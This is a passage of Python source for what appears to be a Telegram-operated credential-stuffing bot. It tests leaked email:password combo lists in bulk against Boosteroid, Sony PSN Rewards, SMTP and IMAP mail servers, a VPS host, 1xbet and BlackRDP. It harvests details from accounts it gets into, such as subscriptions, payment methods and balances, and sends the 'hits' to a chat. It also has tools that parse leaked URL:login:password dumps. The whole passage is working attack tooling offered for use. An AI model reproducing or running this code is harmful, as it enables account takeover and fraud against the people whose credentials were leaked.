            h["Authorization-Data"] = token_data
        return h

    def process_account(self, email, password):
        try:
            nonce = self.calculate_nonce(email, password)
            body  = json.dumps({"client_id":self.CLIENT_ID,"client_secret":self.CLIENT_SECRET,
                                 "email":email,"password":password})
            login_hdrs = {**self._api_headers(),"Nonce":str(nonce),"Content-Length":str(len(body))}
            r_login = requests.post("https://cloud.boosteroid.com/api/v1/auth/login",
                                    data=body, headers=login_hdrs, timeout=14)
            src = r_login.text
            if "We could not find those credentials" in src or r_login.status_code == 422:
                with self.print_lock:
                    self.total_checked += 1
                    self.bad_count += 1
                self.update_telegram_progress()
                return
            if r_login.status_code in (429, 503):
                with self.print_lock:
                    self.total_checked += 1
                    self.blocked_count += 1
                self.update_telegram_progress()
                return
            if '"access_token"' not in src:
                with self.print_lock:
                    self.total_checked += 1
                    self.bad_count += 1
                self.update_telegram_progress()
                return
            tok      = src.split('"access_token":"')[1].split('"')[0]
            tok_data = src.split('"user_data":"')[1].split('"')[0] if '"user_data":"' in src else ""
            api_hdrs = self._api_headers(tok, tok_data)
            # Profile
            name = "Unknown"
            try:
                r_user = requests.get("https://cloud.boosteroid.com/api/v1/user",
                                      headers=api_hdrs, timeout=12)
                us = r_user.text
                if '"name":"' in us:
                    name = us.split('"name":"')[1].split('"')[0]
            except Exception:
                pass
            # Subscription
            has_sub = False
            plan_title = "N/A"
            price = "N/A"
            interval = "N/A"
            auto_renew = "N/A"
            pay_method = "N/A"
            try:
                r_sub = requests.get(
                    "https://cloud.boosteroid.com/api/v1/payments/subscriptions?active=true",
                    headers=api_hdrs, timeout=12)
                ss = r_sub.text
                if '"subscriptionId"' in ss:
                    has_sub = True
                    if '"title":"' in ss:
                        plan_title = ss.split('"title":"')[1].split('"')[0]
                    if '"amount":"' in ss:
                        amt = ss.split('"amount":"')[1].split('"')[0]
                        cur = ss.split('"amountCurrency":"')[1].split('"')[0] if '"amountCurrency":"' in ss else ""
                        intv= ss.split(',"interval":"')[1].split('"')[0] if ',"interval":"' in ss else ""
                        interval  = {"month":"Monthly","year":"Yearly"}.get(intv, intv)
                        price     = f"{amt} {cur}/{intv}"
                    if '"isAutoRenewal":' in ss:
                        auto_renew = "Yes✅" if '"isAutoRenewal":true' in ss else "No❌"
                    if '"paymentSystemTitle":"' in ss:
                        pay_method = ss.split('"paymentSystemTitle":"')[1].split('"')[0]
            except Exception:
                pass
            # Games
            games_str = "N/A"
            try:
                r_games = requests.get(
                    "https://cloud.boosteroid.com/api/v1/boostore/applications/installed?controller=true&orderBy=started",
                    headers=api_hdrs, timeout=12)
                game_names = re.findall(r'"name":"([^"]+)"', r_games.text)
                if game_names:
                    games_str = " | ".join(game_names[:6])
            except Exception:
                pass
            line = (f"{email}:{password} | Name:{name} | Sub:{'YES✅' if has_sub else 'NO❌'}")
            if has_sub:
                line += f" | Plan:{plan_title} | Price:{price} | Billing:{interval} | AutoRenew:{auto_renew} | Pay:{pay_method}"
            if games_str != "N/A":
                line += f" | Games:{games_str}"
            self.save_hit(line, has_sub=has_sub)
            with self.print_lock:
                self.total_checked += 1
                self.good_count    += 1
                if has_sub:
                    self.sub_hits += 1
                else:
                    self.free_hits += 1
        except Exception:
            with self.print_lock:
                self.total_checked += 1
                self.bad_count += 1
        self.update_telegram_progress()

    def update_telegram_progress(self, force=False):
        if not force and (time.time() - self.last_update_time < 4.0):
            return
        with self.print_lock:
            if not force and (time.time() - self.last_update_time < 4.0):
                return
            self.last_update_time = time.time()
            tc,to,gc,bc,bk,sh,fh = (self.total_checked,self.total_combos,self.good_count,
                                      self.bad_count,self.blocked_count,self.sub_hits,self.free_hits)
        pct = (tc/to*100) if to > 0 else 0
        bar = "█"*int(pct/100*20)+"▒"*(20-int(pct/100*20))
        done= tc >= to
        msg = (
            f"☁️ <b>BOOSTEROID CHECKER</b>\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"📈 <code>{tc}/{to}</code> ({pct:.1f}%) [{bar}]\n"
            f"✅ Valid:{gc}  ❌ Bad:{bc}  🔒 Blocked:{bk}\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"🌟 Sub Hits:{sh}  📁 Free:{fh}\n"
            f"{'✅ Done' if done else '⏳ جارٍ...'}\n💎 {MY_SIGNATURE}"
        )
        edit_message(self.bot_token, self.chat_id, self.progress_msg_id, msg)

    def start_scan(self):
        def runner():
            with concurrent.futures.ThreadPoolExecutor(max_workers=15) as pool:
                futures = []
                for line in self.combo_lines:
                    if ":" not in line:
                        continue
                    p = line.split(":",1)
                    futures.append(pool.submit(self.process_account, p[0].strip(), p[1].strip()))
                concurrent.futures.wait(futures)
            self.update_telegram_progress(force=True)
            summary = (
                f"☁️ <b>BOOSTEROID SCAN COMPLETE</b>\n"
                f"• Total: <code>{self.total_checked}</code>\n"
                f"• Valid: <code>{self.good_count}</code>\n"
                f"• Bad: <code>{self.bad_count}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"🌟 Sub Hits: <code>{self.sub_hits}</code>\n"
                f"📁 Free: <code>{self.free_hits}</code>\n"
                f"💎 {MY_SIGNATURE}"
            )
            send_message(self.bot_token, self.chat_id, summary)
            if self.sub_hits > 0 and os.path.exists(self.hits_file):
                send_document(self.bot_token, self.chat_id, self.hits_file,
                              caption=f"☁️ Boosteroid Sub\n{MY_SIGNATURE}")
            if self.free_hits > 0 and os.path.exists(self.free_file):
                send_document(self.bot_token, self.chat_id, self.free_file,
                              caption=f"📁 Boosteroid Free\n{MY_SIGNATURE}")
            if not self.sub_hits and not self.free_hits:
                send_message(self.bot_token, self.chat_id, "ℹ️ No valid Boosteroid accounts found.")
            if self.on_complete_callback:
                self.on_complete_callback(self.chat_id)
        threading.Thread(target=runner, daemon=True).start()


# ══════════════════════════════════════════════════════════════════════════════
# GATE 9: PSN SONY REWARDS CHECKER
# ══════════════════════════════════════════════════════════════════════════════

class PsnSonyRewardsChecker:
    BASE_URL = "https://www.rewards.sony.com"

    def __init__(self, chat_id, bot_token, combo_lines, progress_msg_id):
        self.chat_id = chat_id
        self.bot_token = bot_token
        self.combo_lines = combo_lines
        self.progress_msg_id = progress_msg_id
        self.total_checked = 0
        self.total_combos  = len(combo_lines)
        self.good_count    = 0
        self.bad_count     = 0
        self.blocked_count = 0
        self.hits      = 0
        self.free_hits = 0
        self.last_update_time = 0
        self.print_lock = threading.Lock()
        self.on_complete_callback = None
        self.results_folder = f"Results/{self.chat_id}"
        os.makedirs(self.results_folder, exist_ok=True)
        self.hits_file = f"{self.results_folder}/PSN_Rewards_Hits_by_@hulliyu.txt"
        self.free_file = f"{self.results_folder}/PSN_Rewards_Free_by_@hulliyu.txt"
        with open(self.hits_file,"w",encoding="utf-8") as f:
            f.write(f"# PSN Rewards Registered — {MY_SIGNATURE} {TELEGRAM_CHANNEL}\n\n")
        with open(self.free_file,"w",encoding="utf-8") as f:
            f.write(f"# PSN Rewards Not Registered — {MY_SIGNATURE} {TELEGRAM_CHANNEL}\n\n")

    def save_hit(self, line, is_hit=True):
        with open(self.hits_file if is_hit else self.free_file, "a", encoding="utf-8") as f:
            f.write(line + "\n")

    def _get_csrf(self, session):
        try:
            r = session.get(f"{self.BASE_URL}/UID-Start", headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5"
            }, timeout=14)
            src = r.text
            if 'name="csrf_token"' in src:
                m = re.search(r'csrf_token[^>]+value="([^"]+)"', src)
                if m:
                    return m.group(1)
        except Exception:
            pass
        return ""

    def process_account(self, email, password):
        try:
            session = requests.Session()
            csrf = self._get_csrf(session)
            if not csrf:
                with self.print_lock:
                    self.total_checked += 1
                    self.blocked_count += 1
                self.update_telegram_progress()
                return
            post_data = (
                f"dwfrm_uidloginemail_email={urllib.parse.quote(email)}"
                f"&g-recaptcha-response=&dwfrm_uidloginemail_send=Next"
                f"&csrf_token={urllib.parse.quote(csrf)}"
            )
            r_post = session.post(f"{self.BASE_URL}/UID-SubmitEmail", data=post_data, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": self.BASE_URL,
                "Referer": f"{self.BASE_URL}/UID-Start",
            }, timeout=15, allow_redirects=True)
            src = r_post.text
            if "The information you entered is incorrect" in src:
                line = f"{email}:{password} | PSN Rewards: NOT REGISTERED"
                self.save_hit(line, is_hit=False)
                with self.print_lock:
                    self.total_checked += 1
                    self.bad_count += 1
                    self.free_hits += 1
                self.update_telegram_progress()
                return
            if any(k in src for k in ["g-recaptcha","recaptcha","CAPTCHA"]):
                with self.print_lock:
                    self.total_checked += 1
                    self.blocked_count += 1
                self.update_telegram_progress()
                return
            if "password" in r_post.url.lower() or "login" in r_post.url.lower() or "signin" in r_post.url.lower():
                line = f"{email}:{password} | PSN Rewards: REGISTERED ✅"
                self.save_hit(line, is_hit=True)
                with self.print_lock:
                    self.total_checked += 1
                    self.good_count += 1
                    self.hits += 1
                self.update_telegram_progress()
                return
            # Ambiguous
            with self.print_lock:
                self.total_checked += 1
                self.blocked_count += 1
            self.update_telegram_progress()
        except Exception:
            with self.print_lock:
                self.total_checked += 1
                self.blocked_count += 1
            self.update_telegram_progress()

    def update_telegram_progress(self, force=False):
        if not force and (time.time() - self.last_update_time < 4.0):
            return
        with self.print_lock:
            if not force and (time.time() - self.last_update_time < 4.0):
                return
            self.last_update_time = time.time()
            tc,to,gc,bc,bk = (self.total_checked,self.total_combos,self.good_count,
                               self.bad_count,self.blocked_count)
        pct = (tc/to*100) if to > 0 else 0
        bar = "█"*int(pct/100*20)+"▒"*(20-int(pct/100*20))
        done= tc >= to
        msg = (
            f"🎮 <b>PSN SONY REWARDS CHECKER</b>\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"📈 <code>{tc}/{to}</code> ({pct:.1f}%) [{bar}]\n"
            f"✅ Registered:{gc}  ❌ Not Reg:{bc}  🔒 Captcha:{bk}\n"
            f"{'✅ Done' if done else '⏳ جارٍ...'}\n💎 {MY_SIGNATURE}"
        )
        edit_message(self.bot_token, self.chat_id, self.progress_msg_id, msg)

    def start_scan(self):
        def runner():
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
                futures = []
                for line in self.combo_lines:
                    if ":" not in line:
                        continue
                    p = line.split(":",1)
                    futures.append(pool.submit(self.process_account, p[0].strip(), p[1].strip()))
                concurrent.futures.wait(futures)
            self.update_telegram_progress(force=True)
            summary = (
                f"🎮 <b>PSN SONY REWARDS COMPLETE</b>\n"
                f"• Total: <code>{self.total_checked}</code>\n"
                f"• Registered Hits: <code>{self.hits}</code>\n"
                f"• Not Registered: <code>{self.free_hits}</code>\n"
                f"• Captcha/Blocked: <code>{self.blocked_count}</code>\n"
                f"💎 {MY_SIGNATURE}"
            )
            send_message(self.bot_token, self.chat_id, summary)
            if self.hits > 0 and os.path.exists(self.hits_file):
                send_document(self.bot_token, self.chat_id, self.hits_file,
                              caption=f"🎮 PSN Rewards Registered\n{MY_SIGNATURE}")
            if self.free_hits > 0 and os.path.exists(self.free_file):
                send_document(self.bot_token, self.chat_id, self.free_file,
                              caption=f"📁 Not Registered\n{MY_SIGNATURE}")
            if self.on_complete_callback:
                self.on_complete_callback(self.chat_id)
        threading.Thread(target=runner, daemon=True).start()


# ══════════════════════════════════════════════════════════════════════════════
# TOOL RUNNERS: ULP Extractor / Sorter
# ══════════════════════════════════════════════════════════════════════════════

def _has_arabic(text):
    return bool(re.search(r'[\u0600-\u06FF\u0750-\u077F\uFB50-\uFDFF\uFE70-\uFEFF]', text))

def _parse_ulp_line(line):
    line = line.strip()
    url_m = re.match(r'^https?://[^\s:]+(?:/[^\s:]*)?:(.+):(.+)$', line, re.IGNORECASE)
    if url_m:
        user, pw = url_m.group(1), url_m.group(2)
    else:
        parts = line.split(':')
        if len(parts) < 2:
            return None
        user, pw = parts[-2], parts[-1]
    if not user or not pw or len(user) < 2 or len(pw) < 2:
        return None
    if _has_arabic(user) or _has_arabic(pw):
        return None
    if any(c in user for c in (' ','\t','\r','\n')):
        return None
    return f"{user}:{pw}"

def run_ulp_extractor(token, cid, lines):
    seen  = set()
    valid = []
    bad   = 0
    dups  = 0
    for line in lines:
        result = _parse_ulp_line(line)
        if result is None:
            bad += 1
        elif result in seen:
            dups += 1
        else:
            seen.add(result)
            valid.append(result)
    if not valid:
        send_message(token, cid,
            f"❌ <b>لم يتم استخراج أي كومبو صالح!</b>\nمرفوض: <b>{bad}</b>")
        sess(cid)["state"] = "idle"
        return
    out = "\n".join(valid).encode("utf-8")
    caption = (
        f"╔══════════════════════════╗\n"
        f"║  📋 <b>ULP Extractor</b>         ║\n"
        f"╠══════════════════════════╣\n"
        f"║ ✅ صالح    : <b>{len(valid)}</b>\n"
        f"║ 🔁 مكرر   : <b>{dups}</b>\n"
        f"║ ❌ مرفوض  : <b>{bad}</b>\n"
        f"║ 📦 إجمالي : <b>{len(lines)}</b>\n"
        f"╚══════════════════════════╝"
    )
    send_document_bytes(token, cid, out, "extracted_combos.txt", caption=caption)
    sess(cid)["state"] = "idle"

def run_ulp_sorter(token, cid, lines):
    domain_map = defaultdict(list)
    skipped = 0
    domain_re = re.compile(r'(?:https?://)?([^\s/:]+(?:\.[^\s/:]+)+)')
    for line in lines:
        line = line.strip()
        if not line:
            continue
        dm = domain_re.match(line)
        if not dm:
            skipped += 1
            continue
        raw = dm.group(1).lower()
        parts = raw.split('.')
        base  = '.'.join(parts[-2:]) if len(parts) >= 2 else raw
        combo = _parse_ulp_line(line)
        if combo:
            domain_map[base].append(combo)
        else:
            skipped += 1
    if not domain_map:
        send_message(token, cid, "❌ <b>لم يتم فرز أي سطور!</b>")
        sess(cid)["state"] = "idle"
        return
    all_lines = []
    for dom, items in sorted(domain_map.items()):
        all_lines.append(f"# === {dom} ({len(items)}) ===")
        all_lines.extend(items)
        all_lines.append("")
    top = sorted(domain_map.items(), key=lambda x: -len(x[1]))[:15]
    summary_lines = [f"🌐 {d} — <b>{len(v)}</b>" for d,v in top]
    total_combos = sum(len(v) for v in domain_map.values())
    out = "\n".join(all_lines).encode("utf-8")
    caption = (
        f"╔══════════════════════════╗\n"
        f"║  🔢 <b>ULP Sorter</b>            ║\n"
        f"╠══════════════════════════╣\n"
        f"║ 🌐 دومينات : <b>{len(domain_map)}</b>\n"
        f"║ ✅ كومبو  : <b>{total_combos}</b>\n"
        f"║ ❌ مرفوض  : <b>{skipped}</b>\n"
        f"╠══════════════════════════╣\n"
        + "\n".join(f"║ {l}" for l in summary_lines[:10]) + "\n"
        + f"╚══════════════════════════╝"
    )
    send_document_bytes(token, cid, out, "sorted_by_domain.txt", caption=caption)
    sess(cid)["state"] = "idle"


# ══════════════════════════════════════════════════════════════════════════════
# TOOL RUNNERS: SMTP, VPS, 1xbet, BlackRDP, IMAP, PlainProxy
# ══════════════════════════════════════════════════════════════════════════════

# ── SMTP ──────────────────────────────────────────────────────────────────────

def _smtp_check(email, password, timeout=12):
    domain = email.split('@')[-1]
    hosts  = [f"smtp.{domain}", f"mail.{domain}", f"mx.{domain}"]
    for host in hosts:
        try:
            srv = smtplib.SMTP(host, 587, timeout=timeout)
            srv.starttls()
            srv.login(email, password)
            srv.quit()
            return True, f"{host}:587"
        except smtplib.SMTPAuthenticationError:
            return False, "AUTH_FAIL"
        except Exception:
            pass
        try:
            ctx = ssl.create_default_context()
            srv = smtplib.SMTP_SSL(host, 465, timeout=timeout, context=ctx)
            srv.login(email, password)
            srv.quit()
            return True, f"{host}:465"
        except smtplib.SMTPAuthenticationError:
            return False, "AUTH_FAIL"
        except Exception:
            continue
    return False, "OFFLINE"

def run_smtp_checker(token, cid, lines):
    total = len(lines)
    hits  = []
    bad   = 0
    offline = 0
    checked = 0
    lock = threading.Lock()
    stop_ev = get_stop_event(cid)
    prog_mid = _send_msg_id(token, cid,
        f"╔══════════════════════════╗\n║   📬  <b>SMTP Checker</b>   ║\n"
        f"╠══════════════════════════╣\n║ جاري الفحص... 0/{total}\n╚══════════════════════════╝",
        reply_markup=_stop_markup())

    def check_one(line):
        nonlocal checked, bad, offline
        if stop_ev.is_set():
            return
        parts = line.strip().split(':',1)
        if len(parts) < 2:
            with lock:
                bad += 1; checked += 1
            return
        email, password = parts[0].strip(), parts[1].strip()
        ok, info = _smtp_check(email, password)
        with lock:
            checked += 1
            if ok:
                hit_line = f"✅ {email}:{password} | Host:{info}"
                hits.append(hit_line)
                send_message(token, cid,
                    f"📬 <b>SMTP HIT!</b>\n📧 <code>{email}</code>\n🔑 <code>{password}</code>\n🖥️ {info}")
            elif info == "AUTH_FAIL":
                bad += 1
            else:
                offline += 1

    ex = ThreadPoolExecutor(max_workers=50)
    futures = [ex.submit(check_one, l) for l in lines]
    last_upd = time.time()
    stopped = False
    for fut in as_completed(futures):
        if stop_ev.is_set():
            stopped = True
            ex.shutdown(wait=False)
            break
        if time.time() - last_upd > 5:
            last_upd = time.time()
            try:
                edit_message(token, cid, prog_mid,
                    f"╔══════════════════════════╗\n║   📬  <b>SMTP Checker</b>   ║\n"
                    f"╠══════════════════════════╣\n║ ✅ هيتات : <b>{len(hits)}</b>\n"
                    f"║ ❌ فاشل  : <b>{bad}</b>\n║ 🔴 أوفلاين: <b>{offline}</b>\n"
                    f"║ 📋 تم    : <b>{checked}/{total}</b>\n╚══════════════════════════╝",
                    reply_markup=_stop_markup())
            except Exception:
                pass
    ex.shutdown(wait=False)
    if stopped:
        _stopped_msg(token, cid, prog_mid, hits, checked, total, "SMTP Checker")
        sess(cid)["state"] = "idle"
        return
    _send_checker_results(token, cid, hits, total, checked, bad, offline, "SMTP Checker", "smtp_hits.txt")
    sess(cid)["state"] = "idle"


# ── VPS ───────────────────────────────────────────────────────────────────────

def _vps_check(email, password):
    try:
        session = requests.Session()
        headers = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": "https://www.my-vps.services",
            "referer": "https://www.my-vps.services/login",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        }
        r = session.post("https://www.my-vps.services/api/login",
                         json={"email":email,"password":password},
                         headers=headers, timeout=20)
        if r.status_code != 200:
            return False, None
        data  = r.json()
        token = (data.get('token') or data.get('access_token') or
                 (data.get('data') or {}).get('token'))
        if not token:
            return False, None
        headers['authorization'] = f"Bearer {token}"
        me = session.get("https://www.my-vps.services/api/me", headers=headers, timeout=15)
        if me.status_code == 200:
            info = me.json()
            if isinstance(info, dict) and 'data' in info:
                info = info['data']
            return True, info
        return True, {}
    except Exception:
        return False, None

def run_vps_checker(token, cid, lines):
    total = len(lines)
    hits  = []
    bad   = 0
    errors= 0
    checked = 0
    lock = threading.Lock()
    stop_ev = get_stop_event(cid)
    prog_mid = _send_msg_id(token, cid,
        f"╔══════════════════════════╗\n║   🖥️  <b>VPS Checker</b>    ║\n"
        f"╠══════════════════════════╣\n║ جاري الفحص... 0/{total}\n╚══════════════════════════╝",
        reply_markup=_stop_markup())

    def check_one(line):
        nonlocal checked, bad, errors
        if stop_ev.is_set():
            return
        parts = line.strip().split(':',1)
        if len(parts) < 2:
            with lock:
                bad += 1; checked += 1
            return
        email, password = parts[0].strip(), parts[1].strip()
        ok, info = _vps_check(email, password)
        with lock:
            checked += 1
            if ok:
                if isinstance(info, dict):
                    name    = info.get('name','N/A')
                    credits = info.get('credits','N/A')
                    status  = info.get('status','N/A')
                    country = info.get('country_name','N/A')
                    details = f"Name:{name} Credits:{credits} Status:{status} Country:{country}"
                else:
                    details = "Valid"
                hits.append(f"✅ {email}:{password} | {details}")
                send_message(token, cid,
                    f"🖥️ <b>VPS HIT!</b>\n📧 <code>{email}</code>\n🔑 <code>{password}</code>\n{details}")
            elif info is None:
                errors += 1
            else:
                bad += 1

    ex = ThreadPoolExecutor(max_workers=20)
    futures = [ex.submit(check_one, l) for l in lines]
    last_upd = time.time()
    stopped = False
    for fut in as_completed(futures):
        if stop_ev.is_set():
            stopped = True
            ex.shutdown(wait=False)
            break
        if time.time() - last_upd > 5:
            last_upd = time.time()
            try:
                edit_message(token, cid, prog_mid,
                    f"╔══════════════════════════╗\n║   🖥️  <b>VPS Checker</b>    ║\n"
                    f"╠══════════════════════════╣\n║ ✅ هيتات : <b>{len(hits)}</b>\n"
                    f"║ ❌ خاطئ  : <b>{bad}</b>\n║ ⚠️ خطأ   : <b>{errors}</b>\n"
                    f"║ 📋 تم    : <b>{checked}/{total}</b>\n╚══════════════════════════╝",
                    reply_markup=_stop_markup())
            except Exception:
                pass
    ex.shutdown(wait=False)
    if stopped:
        _stopped_msg(token, cid, prog_mid, hits, checked, total, "VPS Checker")
        sess(cid)["state"] = "idle"
        return
    _send_checker_results(token, cid, hits, total, checked, bad, errors, "VPS Checker", "vps_hits.txt")
    sess(cid)["state"] = "idle"


# ── 1xbet ─────────────────────────────────────────────────────────────────────

def _1xbet_encrypt_password(password, time_val):
    rev_time  = str(time_val)[::-1]
    md5_bytes = hashlib.md5(rev_time.encode()).digest()
    pb = password.encode()
    result = bytearray(len(pb))
    for i in range(len(pb)):
        result[i] = pb[i] ^ md5_bytes[i % len(md5_bytes)]
    return base64.b64encode(result).decode()

def _1xbet_check(email, password):
    try:
        time_val = int(time.time()) + 5
        enc  = _1xbet_encrypt_password(password, time_val)
        guid = ''.join(random.choice('0123456789abcdef') for _ in range(16)) + '_2'
        payload = json.dumps({
            "Answer":"","AppGuid":guid,"Date":str(time_val),"Language":"en_GB",
            "Login":email,"OS":"Android","OSVersion":"10","Partner":1,"Password":enc,
            "QrCode":None,"Version":"1xBet-ma v.251.0.2","Whence":22
        })
        headers = {
            'User-Agent': "org.xbet.client.ma-user-agent/1xbet_ma-v251.0.2",
            'Content-Type': "application/json", 'x-language': "en_GB",
            'x-whence': "22", 'x-referral': "1", 'x-group': "2527",
            'x-bundleid': "org.xbet.client.ma", 'x-fcountry': "125",
            'version': "1xbet_ma-v251.0.2", 'x-devicemanufacturer': "Apple",
            'x-devicemodel': "IPhone X (Global)"
        }
        r = requests.post("https://api.ma-1xbet.com/UserAuth/Auth",
                          params={'v':'5.0'}, data=payload, headers=headers, timeout=15)
        if '"Success":true' in r.text:
            return 'valid', None
        elif 'new location' in r.text:
            return '2fa', None
        elif 'Invalid username or password' in r.text:
            return 'bad', None
        elif 'exceeded the maximum' in r.text:
            return 'ratelimit', None
        return 'unknown', None
    except Exception:
        return 'error', None

def run_1xbet_checker(token, cid, lines):
    total = len(lines)
    hits  = []
    twofa = []
    bad   = 0
    errors= 0
    checked = 0
    lock = threading.Lock()
    stop_ev = get_stop_event(cid)
    prog_mid = _send_msg_id(token, cid,
        f"╔══════════════════════════╗\n║   🎲  <b>1xbet Checker</b>   ║\n"
        f"╠══════════════════════════╣\n║ جاري الفحص... 0/{total}\n╚══════════════════════════╝",
        reply_markup=_stop_markup())

    def check_one(line):
        nonlocal checked, bad, errors
        if stop_ev.is_set():
            return
        parts = line.strip().split(':',1)
        if len(parts) < 2:
            with lock:
                bad += 1; checked += 1
            return
        email, password = parts[0].strip(), parts[1].strip()
        status, info = _1xbet_check(email, password)
        with lock:
            checked += 1
            if status == 'valid':
                hits.append(f"✅ {email}:{password}")
                send_message(token, cid,
                    f"🎲 <b>1xbet HIT!</b>\n📧 <code>{email}</code>\n🔑 <code>{password}</code>")
            elif status == '2fa':
                twofa.append(f"🔐 {email}:{password}")
            elif status == 'bad':
                bad += 1
            else:
                errors += 1

    ex = ThreadPoolExecutor(max_workers=30)
    futures = [ex.submit(check_one, l) for l in lines]
    last_upd = time.time()
    stopped = False
    for fut in as_completed(futures):
        if stop_ev.is_set():
            stopped = True
            ex.shutdown(wait=False)
            break
        if time.time() - last_upd > 5:
            last_upd = time.time()
            try:
                edit_message(token, cid, prog_mid,
                    f"╔══════════════════════════╗\n║   🎲  <b>1xbet Checker</b>   ║\n"
                    f"╠══════════════════════════╣\n║ ✅ هيتات : <b>{len(hits)}</b>\n"
                    f"║ 🔐 2FA    : <b>{len(twofa)}</b>\n║ ❌ خاطئ  : <b>{bad}</b>\n"
                    f"║ 📋 تم    : <b>{checked}/{total}</b>\n╚══════════════════════════╝",
                    reply_markup=_stop_markup())
            except Exception:
                pass
    ex.shutdown(wait=False)
    if stopped:
        _stopped_msg(token, cid, prog_mid, hits + twofa, checked, total, "1xbet Checker")
    _send_checker_results(token, cid, hits + twofa, total, checked, bad, errors,
                          "1xbet Checker", "1xbet_hits.txt")
    sess(cid)["state"] = "idle"


# ── BlackRDP ──────────────────────────────────────────────────────────────────

def _blackrdp_check(email, password):
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://blackrdp.com",
        "Referer": "https://blackrdp.com/login",
        "User-Agent": ("Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36 "
                       "Chrome/139.0.0.0 Mobile Safari/537.36"),
    }
    try:
        rdp_session = requests.Session()
        r = rdp_session.post('https://blackrdp.com/api/auth/sign-in/email',
                      headers=headers,
                      json={'email':email,'password':password,'rememberMe':False},
                      timeout=15)
        if 'token' not in r.text:
            return False, None
        info = {}
        try:
            me = rdp_session.get('https://blackrdp.com/api/auth/get-session', headers=headers, timeout=10)
            if me.status_code == 200:
                data = me.json()
                user = data.get('user',{})
                info['name']     = user.get('name','N/A')
                info['verified'] = user.get('emailVerified',False)
                raw_dt = user.get('createdAt','')
                if raw_dt:
                    try:
                        dt = datetime.datetime.fromisoformat(raw_dt.replace('Z','+00:00'))
                        info['created'] = dt.strftime('%Y-%m-%d')
                    except Exception:
                        info['created'] = raw_dt[:10]
        except Exception:
            pass
        for ep in ['wallet','balance','credit']:
            try:
                br = rdp_session.get(f'https://blackrdp.com/api/user/{ep}', headers=headers, timeout=8)
                if br.status_code == 200:
                    bd = br.json()
                    bal = (bd.get('balance') or bd.get('credit') or bd.get('amount') or
                           (bd.get('data') or {}).get('balance'))
                    if bal is not None:
                        info['balance'] = bal
                        break
            except Exception:
                continue
        try:
            vr = rdp_session.get('https://blackrdp.com/api/user/vps',
                          headers={**headers,'referer':'https://blackrdp.com/dashboard/vps'},
                          params={'action':'list'}, timeout=10)
            if vr.status_code == 200:
                vd = vr.json()
                info['vps'] = len(vd) if isinstance(vd,list) else len((vd.get('data') or []))
        except Exception:
            info['vps'] = 0
        return True, info
    except Exception:
        return False, None

def run_blackrdp_checker(token, cid, lines):
    total = len(lines)
    hits  = []
    bad   = 0
    errors= 0
    checked = 0
    lock = threading.Lock()
    stop_ev = get_stop_event(cid)
    prog_mid = _send_msg_id(token, cid,
        f"╔══════════════════════════╗\n║   🖥️  <b>BlackRDP Checker</b> ║\n"
        f"╠══════════════════════════╣\n║ جاري الفحص... 0/{total}\n╚══════════════════════════╝",
        reply_markup=_stop_markup())

    def check_one(line):
        nonlocal checked, bad, errors
        if stop_ev.is_set():
            return
        parts = line.strip().split(':',1)
        if len(parts) < 2:
            with lock:
                bad += 1; checked += 1
            return
        email, password = parts[0].strip(), parts[1].strip()
        ok, info = _blackrdp_check(email, password)
        with lock:
            checked += 1
            if ok:
                name    = (info or {}).get('name','N/A')
                balance = (info or {}).get('balance','N/A')
                vps     = (info or {}).get('vps',0)
                created = (info or {}).get('created','N/A')
                hit_line= (f"✅ {email}:{password} | Name:{name} | Balance:{balance} | VPS:{vps} | Created:{created}")
                hits.append(hit_line)
                send_message(token, cid,
                    f"🖥️ <b>BlackRDP HIT!</b>\n📧 <code>{email}</code>\n🔑 <code>{password}</code>\n"
                    f"👤 {name}\n💰 {balance}\n🖥️ VPS:{vps}\n📅 {created}")
            elif info is None:
                errors += 1
            else:
                bad += 1

    ex = ThreadPoolExecutor(max_workers=25)
    futures = [ex.submit(check_one, l) for l in lines]
    last_upd = time.time()
    stopped = False
    for fut in as_completed(futures):
        if stop_ev.is_set():
            stopped = True
            ex.shutdown(wait=False)
            break
        if time.time() - last_upd > 5:
            last_upd = time.time()
            try:
                edit_message(token, cid, prog_mid,
                    f"╔══════════════════════════╗\n║   🖥️  <b>BlackRDP Checker</b> ║\n"
                    f"╠══════════════════════════╣\n║ ✅ هيتات : <b>{len(hits)}</b>\n"
                    f"║ ❌ خاطئ  : <b>{bad}</b>\n║ ⚠️ خطأ   : <b>{errors}</b>\n"
                    f"║ 📋 تم    : <b>{checked}/{total}</b>\n╚══════════════════════════╝",
                    reply_markup=_stop_markup())
            except Exception:
                pass
    ex.shutdown(wait=False)
    if stopped:
        _stopped_msg(token, cid, prog_mid, hits, checked, total, "BlackRDP Checker")
        sess(cid)["state"] = "idle"
        return
    _send_checker_results(token, cid, hits, total, checked, bad, errors,
                          "BlackRDP Checker", "blackrdp_hits.txt")
    sess(cid)["state"] = "idle"


# ── IMAP ──────────────────────────────────────────────────────────────────────

_IMAP_SERVERS: dict = {
    'gmail.com':('imap.gmail.com',993),'googlemail.com':('imap.gmail.com',993),
    'outlook.com':('outlook.office365.com',993),'hotmail.com':('outlook.office365.com',993),
    'hotmail.co.uk':('outlook.office365.com',993),'hotmail.fr':('outlook.office365.com',993),
    'hotmail.de':('outlook.office365.com',993),'live.com':('outlook.office365.com',993),
    'live.co.uk':('outlook.office365.com',993),'live.fr':('outlook.office365.com',993),
    'live.de':('outlook.office365.com',993),'msn.com':('outlook.office365.com',993),
    'yahoo.com':('imap.mail.yahoo.com',993),'yahoo.co.uk':('imap.mail.yahoo.com',993),
    'yahoo.fr':('imap.mail.yahoo.com',993),'yahoo.de':('imap.mail.yahoo.com',993),
